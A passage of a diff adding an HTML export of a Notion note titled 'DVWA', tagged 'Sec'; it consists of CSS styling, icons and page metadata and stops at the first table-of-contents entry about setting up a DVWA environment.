@@ -1,0 +1,943 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>DVWA</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+}
+
+.simple-table-header {
+	background: rgb(247, 246, 243);
+	color: black;
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="7ed9db8c-64ed-4531-a35a-5f585e5a205f" class="page serif"><header><div class="page-header-icon undefined"><span class="icon">🎾</span></div><h1 class="page-title">DVWA</h1><table class="properties"><tbody><tr class="property-row property-row-created_by"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedBy"><path d="M13.125,10.0354 C12.5536,9.48588 10.801,8.53125 9.625,7.875 L9.625,7.04112 C9.849,6.71912 10.045,6.37 10.1911,5.98588 C10.5849,5.7435 10.9375,5.28412 10.9375,4.8125 C10.9375,4.35488 10.9323,3.94275 10.4668,3.605 C10.3049,1.5575 9.436,0 7,0 C4.564,0 3.69513,1.5575 3.53325,3.605 C3.06775,3.94275 3.0625,4.35488 3.0625,4.8125 C3.0625,5.28412 3.41513,5.7435 3.80888,5.98588 C3.955,6.37 4.151,6.71912 4.375,7.04112 L4.375,7.875 C3.199,8.53125 1.44638,9.48588 0.875,10.0354 C0.1645,10.7188 0,11.8125 0,14 L14,14 C14,11.8125 13.8364,10.7188 13.125,10.0354 Z"></path></svg></span>Created By</th><td></td></tr><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M6.98643729,14.0000972 C5.19579566,14.0000972 3.40419152,13.3106896 2.04245843,11.9323606 C-0.681017475,9.21200555 -0.680780251,4.76029539 2.04293482,2.04012507 C4.76664406,-0.68004331 9.22427509,-0.68004331 11.9480135,2.04013479 C13.272481,3.36277455 14,5.1330091 14,6.99552762 C14,8.87640182 13.2721894,10.6285043 11.9480135,11.9509302 C10.5679344,13.3105924 8.77756503,14.0000972 6.98643729,14.0000972 Z M10.2705296,7.00913883 L10.2705296,8.46099754 L10.2705296,8.65543362 L10.076181,8.65543362 L8.6543739,8.65543362 L5.72059514,8.65543362 L5.52619796,8.65543362 L5.52619796,8.46099754 L5.52619796,5.52541044 L5.52619796,3.37946773 L5.52619796,3.18502193 L5.72059514,3.18502193 L7.17253164,3.18502193 L7.36692883,3.18502193 L7.36692883,3.37946773 L7.36692883,6.81467358 L10.076181,6.81467358 L10.2705296,6.81467358 L10.2705296,7.00913883 Z M12.1601539,6.99552762 C12.1601539,5.61697497 11.6190112,4.32597154 10.6393933,3.34769528 C8.63253764,1.34336744 5.35197452,1.34061603 3.34153136,3.33944106 C3.33868273,3.34219247 3.33607716,3.34494388 3.33322852,3.34769528 C1.32397148,5.35459953 1.32372842,8.63641682 3.33322852,10.6433794 C5.34295224,12.6504489 8.62968901,12.6504489 10.6393933,10.6433794 C11.6190112,9.66506426 12.1601539,8.37408027 12.1601539,6.99552762 Z"></path></svg></span>Created time</th><td><time>@January 28, 2022 4:30 PM</time></td></tr><tr class="property-row property-row-last_edited_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M6.98643729,14.0000972 C5.19579566,14.0000972 3.40419152,13.3106896 2.04245843,11.9323606 C-0.681017475,9.21200555 -0.680780251,4.76029539 2.04293482,2.04012507 C4.76664406,-0.68004331 9.22427509,-0.68004331 11.9480135,2.04013479 C13.272481,3.36277455 14,5.1330091 14,6.99552762 C14,8.87640182 13.2721894,10.6285043 11.9480135,11.9509302 C10.5679344,13.3105924 8.77756503,14.0000972 6.98643729,14.0000972 Z M10.2705296,7.00913883 L10.2705296,8.46099754 L10.2705296,8.65543362 L10.076181,8.65543362 L8.6543739,8.65543362 L5.72059514,8.65543362 L5.52619796,8.65543362 L5.52619796,8.46099754 L5.52619796,5.52541044 L5.52619796,3.37946773 L5.52619796,3.18502193 L5.72059514,3.18502193 L7.17253164,3.18502193 L7.36692883,3.18502193 L7.36692883,3.37946773 L7.36692883,6.81467358 L10.076181,6.81467358 L10.2705296,6.81467358 L10.2705296,7.00913883 Z M12.1601539,6.99552762 C12.1601539,5.61697497 11.6190112,4.32597154 10.6393933,3.34769528 C8.63253764,1.34336744 5.35197452,1.34061603 3.34153136,3.33944106 C3.33868273,3.34219247 3.33607716,3.34494388 3.33322852,3.34769528 C1.32397148,5.35459953 1.32372842,8.63641682 3.33322852,10.6433794 C5.34295224,12.6504489 8.62968901,12.6504489 10.6393933,10.6433794 C11.6190112,9.66506426 12.1601539,8.37408027 12.1601539,6.99552762 Z"></path></svg></span>Last Edited</th><td><time>@February 7, 2022 10:02 PM</time></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-pink">Sec</span></td></tr><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>Author</th><td></td></tr><tr class="property-row property-row-url"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesUrl"><path d="M3.73333,3.86667 L7.46667,3.86667 C8.49613,3.86667 9.33333,4.70387 9.33333,5.73333 C9.33333,6.7628 8.49613,7.6 7.46667,7.6 L6.53333,7.6 C6.01813,7.6 5.6,8.0186 5.6,8.53333 C5.6,9.04807 6.01813,9.46667 6.53333,9.46667 L7.46667,9.46667 C9.5284,9.46667 11.2,7.79507 11.2,5.73333 C11.2,3.6716 9.5284,2 7.46667,2 L3.73333,2 C1.6716,2 0,3.6716 0,5.73333 C0,7.124 0.762067,8.33453 1.88953,8.97713 C1.87553,8.83107 1.86667,8.6836 1.86667,8.53333 C1.86667,7.92013 1.98753,7.33447 2.2036,6.7978 C1.99267,6.4954 1.86667,6.12953 1.86667,5.73333 C1.86667,4.70387 2.70387,3.86667 3.73333,3.86667 Z M12.1095,5.28907 C12.1231,5.4356 12.1333,5.58307 12.1333,5.73333 C12.1333,6.34607 12.0101,6.9294 11.7931,7.46513 C12.0059,7.768 12.1333,8.13573 12.1333,8.53333 C12.1333,9.5628 11.2961,10.4 10.2667,10.4 L6.53333,10.4 C5.50387,10.4 4.66667,9.5628 4.66667,8.53333 C4.66667,7.50387 5.50387,6.66667 6.53333,6.66667 L7.46667,6.66667 C7.98187,6.66667 8.4,6.24807 8.4,5.73333 C8.4,5.2186 7.98187,4.8 7.46667,4.8 L6.53333,4.8 C4.4716,4.8 2.8,6.4716 2.8,8.53333 C2.8,10.59507 4.4716,12.2667 6.53333,12.2667 L10.2667,12.2667 C12.3284,12.2667 14,10.59507 14,8.53333 C14,7.14267 13.2375,5.93167 12.1095,5.28907 Z"></path></svg></span>URL</th><td></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>Topic</th><td></td></tr><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M6.98643729,14.0000972 C5.19579566,14.0000972 3.40419152,13.3106896 2.04245843,11.9323606 C-0.681017475,9.21200555 -0.680780251,4.76029539 2.04293482,2.04012507 C4.76664406,-0.68004331 9.22427509,-0.68004331 11.9480135,2.04013479 C13.272481,3.36277455 14,5.1330091 14,6.99552762 C14,8.87640182 13.2721894,10.6285043 11.9480135,11.9509302 C10.5679344,13.3105924 8.77756503,14.0000972 6.98643729,14.0000972 Z M10.2705296,7.00913883 L10.2705296,8.46099754 L10.2705296,8.65543362 L10.076181,8.65543362 L8.6543739,8.65543362 L5.72059514,8.65543362 L5.52619796,8.65543362 L5.52619796,8.46099754 L5.52619796,5.52541044 L5.52619796,3.37946773 L5.52619796,3.18502193 L5.72059514,3.18502193 L7.17253164,3.18502193 L7.36692883,3.18502193 L7.36692883,3.37946773 L7.36692883,6.81467358 L10.076181,6.81467358 L10.2705296,6.81467358 L10.2705296,7.00913883 Z M12.1601539,6.99552762 C12.1601539,5.61697497 11.6190112,4.32597154 10.6393933,3.34769528 C8.63253764,1.34336744 5.35197452,1.34061603 3.34153136,3.33944106 C3.33868273,3.34219247 3.33607716,3.34494388 3.33322852,3.34769528 C1.32397148,5.35459953 1.32372842,8.63641682 3.33322852,10.6433794 C5.34295224,12.6504489 8.62968901,12.6504489 10.6393933,10.6433794 C11.6190112,9.66506426 12.1601539,8.37408027 12.1601539,6.99552762 Z"></path></svg></span>Property</th><td><time>@January 28, 2022 4:30 PM</time></td></tr></tbody></table></header><div class="page-body"><hr id="c3edd1d4-65b3-42f8-b193-27c1453d7a37"/><nav id="bceb8649-dfb0-4627-a8d4-cdf4a1e33437" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#4f40850f-8ceb-4159-8b6e-a6d0bf0c0387">DVWA 環境</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" 